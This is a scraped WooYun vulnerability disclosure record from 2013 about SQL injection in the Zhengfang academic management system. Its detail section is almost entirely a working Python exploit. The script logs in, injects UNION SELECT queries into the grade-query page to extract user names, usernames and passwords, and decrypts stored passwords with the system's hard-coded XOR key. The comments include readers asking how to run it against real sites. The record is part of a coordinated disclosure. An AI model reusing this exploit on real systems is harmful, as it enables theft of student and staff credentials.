{"id": 14426, "wybug_id": "wooyun-2013-017163", "wybug_title": "杭州正方教务管理系统SQL注射漏洞，可查询任意数据并附带exp", "wybug_corp": "杭州正方", "wybug_author": "monster", "wybug_date": "2013-01-10 14:23", "wybug_open_date": "2013-02-24 14:24", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-01-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-01-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-01-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-02-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-02-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-02-24：\t细节向公众公开  简要描述： 可以插入任意SQL语句 详细说明：  \n#! /usr/bin/env python# coding=utf-8import sysimport requestsurl_root = 'http://***.com/'url_login = ''url_query = ''cookie = {}def help():\tprint 'Usage : ', sys.argv[0], 'user'\tdef login():\tglobal cookie\tr = requests.get(url_root)\tt = r.headers['set-cookie'].split(';')[0].split('=')\tcookie[t[0]] = t[1]\tpostdata = {}\tt = r.content[r.content.find('__VIEWSTATE') + 20:]\tt = t[:t.find('\"')]\tpostdata['__VIEWSTATE'] = t\tpostdata['TextBox1'] = '****'\tpostdata['TextBox2'] = '****'\tpostdata['Button1'] = ''\tpostdata['Button2'] = ''\tpostdata['RadioButtonList1'] = '学生'.decode('utf-8').encode('gbk')\tr = requests.post(url_login, cookies=cookie, data=postdata)\tif len(r.history) == 0:\t\tprint '登陆失败'\t\tsys.exit()def query(sql):\tglobal url_query, cookie\tresult = []\theader = {}\theader['Referer'] = url_root\theader['Host'] = '****'\tr = requests.get(url_query, cookies=cookie, headers=header)\tt = r.content.decode('gbk').encode('utf-8')\tt = t[t.find('__VIEWSTATE')+20:]\tt = t[:t.find('\"')]\tpostdata = {}\tpostdata['__VIEWSTATE'] = t\tpostdata['Dropdownlist5'] = ''\tpostdata['Dropdownlist3'] = 'a.xh'\tpostdata['Dropdownlist4'] = ''\tpostdata['Dropdownlist1'] = ''\tpostdata['Dropdownlist2'] = ''\tpostdata['Button5'] = '查  询'.decode('utf-8').encode('gbk')\tpostdata['TextBox1'] = sql\tr = requests.post(url_query, data=postdata, cookies=cookie, headers=header)\tt = r.content.decode('gbk').encode('utf-8')\tt = t[t.find('Dropdownlist4\">')+15:]\tt = t[:t.find('</select>')]\twhile True:\t\tpos = t.find('\">')\t\tif pos == -1:\t\t\tbreak\t\tt = t[pos + 2:]\t\tx = t[:t.find('</option>')]\t\tt = t[t.find('</option>') + 9:]\t\tresult.append(x)\treturn resultdef main():\tglobal url_root, url_login, url_query\turl_login = url_root + 'default2.aspx'\turl_query = url_root + 'cjcx.aspx?xh=****'# + sys.argv[2]\tlogin()\txm = query(\"888888' union select yhm||xm yhm,xm from yhb where xm like '%\" + sys.argv[1].decode('utf-8').encode('gbk'))\tyhm = query(\"888888' union select yhm||yhm yhm,yhm from yhb where xm like '%\" + sys.argv[1].decode('utf-8').encode('gbk'))\tjsmm = query(\"888888' union select yhm||jsmm yhm,jsmm from yhb where xm like '%\" + sys.argv[1].decode('utf-8').encode('gbk'))\tjskcmm = query(\"888888' union select yhm||jskcmm yhm,jskcmm from yhb where xm like '%\" + sys.argv[1].decode('utf-8').encode('gbk'))\tprint ''\tprint '%-12s%-13s%-16s%-16s' % ('姓名', '用户名', '登录密码', '课程密码')\tprint '--------------------------------------------------------'\tfor i in range(len(xm)):\t\txm[i] = xm[i][5:]\t\tyhm[i] = yhm[i][5:]\t\tjsmm[i] = jsmm[i][5:]\t\tjskcmm[i] = jskcmm[i][5:]\t\tif len(xm[i]) == 6:\t\t\txm[i] = xm[i][:3] + '  ' + xm[i][3:]\t\t\tjskcmm[i] = decode(jskcmm[i])\t\telse:\t\t\tyhm[i] = ' ' + yhm[i]\t\t\tjsmm[i] = ' ' + jsmm[i]\t\t\tjskcmm[i] = ' ' + decode(jskcmm[i])\t\tprint '%-12s%-10s%-16s%-16s' % (xm[i], yhm[i], jsmm[i], jskcmm[i])\tprint ''\tdef decode(src):\tkey = 'Encrypt01'\tstr3 = ''\tnum3 = 0\tnum4 = len(src)\tif len(src) % 2 == 0:\t\tstr4 = src[:num4/2]\t\tstr4 = str4[::-1]\t\tstr5 = src[num4/2:]\t\tstr5 = str5[::-1]\t\tsrc = str4 + str5\tfor i in range(num4):\t\tstr6 = src[i:i+1]\t\tstr2 = key[num3:num3+1]\t\tif ((ord(str6[0]) ^ ord(str2[0])) < 0x20) or ((ord(str6[0]) ^ ord(str2[0])) > 0x7E) or (ord(str6[0]) < 0) or (ord(str6[0]) > 0xFF):\t\t\tstr3 = str3 + str6\t\telse:\t\t\tstr3 = str3 + str(chr(ord(str6[0]) ^ ord(str2[0])))\t\tnum3 = num3 + 1\t\tif num3 == len(key):\t\t\tnum3 = 0\treturn str3if __name__ == '__main__':\tif len(sys.argv) != 2:\t\thelp()\t\tsys.exit()\tmain()\n   漏洞证明：     修复方案：  过滤   版权声明：转载请注明来源 monster@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：14  确认时间：2013-01-14 20:32 厂商回复： CNVD确认漏洞情况，同时CNVD已着手对近期白帽子报送的与正方教务系统相关的所有漏洞进行重新汇总验证，提交软件生产厂商，取得更好的处置效果。rank 14 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-01-10 14:32 |    \t\t疯子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:42        | 世人笑我太疯癫，我笑世人看不穿~)\t\t \n  mark     \n     2013-01-10 15:15 |    \t\tmajin78 \t\t\t( 路人 |\t\t\t        Rank:9 漏洞数:1        | majin78)\t\t \n  围观啊~大神！！！！！    \n     2013-01-10 15:48 |    \t\t無情 \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:5        | 根据相关法律法规和政策，此信息未予显示。)\t\t \n  还附带exp。。     \n     2013-01-10 17:19 |    \t\tmilk \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:5        | 美女，你肥皂掉了)\t\t \n  exp    \n     2013-01-10 20:10 |    \t\tDocee \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:3        | 屌丝)\t\t \n  围观中。。。一提到正方就来劲。。。    \n     2013-01-11 15:20 |    \t\t小威 \t\t\t( 普通白帽子  |\t\t\t        Rank:492 漏洞数:76        | 活到老，学到老!)\t\t \n  又得有多少妹子被学长撸下来    \n     2013-01-13 16:37 |    \t\t笔墨 \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:20        | 瘦子)\t\t \n  期待exp！    \n     2013-01-14 21:30 |    \t\tenab1e \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | 热爱信息安全，希望能为安全作出一点点贡献...)\t\t \n  正方，很多学校在使用吧    \n     2013-01-14 22:52 |    \t\tonfocus \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | php)\t\t \n  唉。。。。为啥要公开啊。。。。。    \n     2013-01-14 23:43 |    \t\tChnhawk \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 菜鸟安全 菜鸟黑客 0day)\t\t \n  恭贺！！！    \n     2013-01-15 09:32 |    \t\t黄色沙漠 \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:1        )\t\t \n  恭贺哈    \n     2013-02-04 09:42 |    \t\t瓜瓜 \t\t\t( 普通白帽子  |\t\t\t        Rank:173 漏洞数:25        )\t\t \n  求思路....这个咋找到的呃。。。    \n     2013-02-14 00:50 |    \t\tDocee \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:3        | 屌丝)\t\t \n  厉害。。。注入的同时还把密码给解出来。    \n     2013-02-14 13:34 |    \t\t黄色沙漠 \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:1        )\t\t \n  太给力了，这次厂商得修复了吧，exp！    \n     2013-02-20 12:34 |    \t\t灰色帽子 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 为什么我是灰色帽子呢，因为我总是拿不到最...)\t\t \n  没研究过python，求教大神，如何运行啊。需要改哪些参数···    \n     2013-02-20 20:23 |    \t\t黄色沙漠 \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:1        )\t\t \n  @灰色帽子 有sql了构造地址xxoo哈 好好读读原理不难懂的吧    \n     2013-02-21 11:07 |    \t\t灰色帽子 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 为什么我是灰色帽子呢，因为我总是拿不到最...)\t\t \n  @黄色沙漠 url_root = 'http://***.com/'这二改成教务管理的地址url_login = ''这是填什么呢?url_query = ''这里是sql语句.关键是怎么运行啊,我架设了python环境,.无法运行,提示符号错误...    \n     2013-02-21 11:08 |    \t\t灰色帽子 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 为什么我是灰色帽子呢，因为我总是拿不到最...)\t\t \n  @Docee 求教大神,如何运行此代码,需要改哪些参数?    \n     2013-02-24 15:18 |    \t\t神刀 \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:3        | www.shellsec.com内射那么牛，虾米没妹子？)\t\t \n  还附带exp。。    \n     2013-02-24 22:07 |    \t\tDocee \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:3        | 屌丝)\t\t \n  @灰色帽子 我没运行。。。看看代码就知道原理了啊。    \n     2013-02-24 22:31 |    \t\t中国公民 \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:12        | 脱裤不提交，提交不脱裤)\t\t \n  @灰色帽子 知道怎么运行了吗？    \n     2013-02-25 00:51 |    \t\t灰色帽子 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 为什么我是灰色帽子呢，因为我总是拿不到最...)\t\t \n  @中国公民 知道了,但是,,,,利用失败...    \n     2013-03-12 19:20 |    \t\t射不出来 \t\t\t( 路人 |\t\t\t        Rank:7 漏洞数:4        | 我是来混的...)\t\t \n  求指点如何运行…    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 14, "Ranks": null}